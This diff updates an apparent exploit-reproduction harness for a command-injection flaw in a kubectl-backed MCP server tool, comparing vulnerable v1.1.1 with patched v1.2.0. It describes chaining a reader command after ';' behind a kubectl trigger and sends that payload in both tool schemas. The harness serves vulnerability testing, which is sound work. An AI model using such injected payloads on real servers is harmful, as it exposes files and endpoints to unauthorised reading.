@@ -7,8 +7,11 @@ tool response. v1.2.0 requires a `query` argument, parses with `shlex.split` and
 `shell=False`, neutralising the injection.
 
 Every exploit prefixes the kubectl trigger, then chains a command after `;`: `kubectl version
---client` exits first, then the injected reader runs. One dedicated exploit per kept place names
-the location it reads. The slim image carries no curl, so the HTTP-endpoint readers use python3.
+--client` exits first, then the injected reader runs. Each call carries the payload in both tool
+schemas, as the benign call does, so the patched version runs it through shlex.split and
+shell=False instead of rejecting the call at input validation. One dedicated exploit per kept
+place names the location it reads. The slim image carries no curl, so the HTTP-endpoint readers
+use python3.
 
 The benign call runs process_natural_language('get pods'), which the server translates to
 `kubectl get pods`. kubectl is the real software the server shells out to, so it reaches a real
@@ -77,7 +80,11 @@ KEPT_PLACES = (
 def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
     async def run(places: Places, client: MCPClientPort) -> None:
         payload = TRIGGER + _cmd_for(places[place_id])
-        await client.call_tool(TOOL, {"args": json.dumps([payload]), "kwargs": "{}"})
+        # v1.1.1 declares args/kwargs, v1.2.0 a required query: a call carrying only the first
+        # fails v1.2.0's validation before any code runs, which would make the patched result void.
+        await client.call_tool(
+            TOOL, {"args": json.dumps([payload]), "kwargs": "{}", "query": payload}
+        )
 
     return run
 
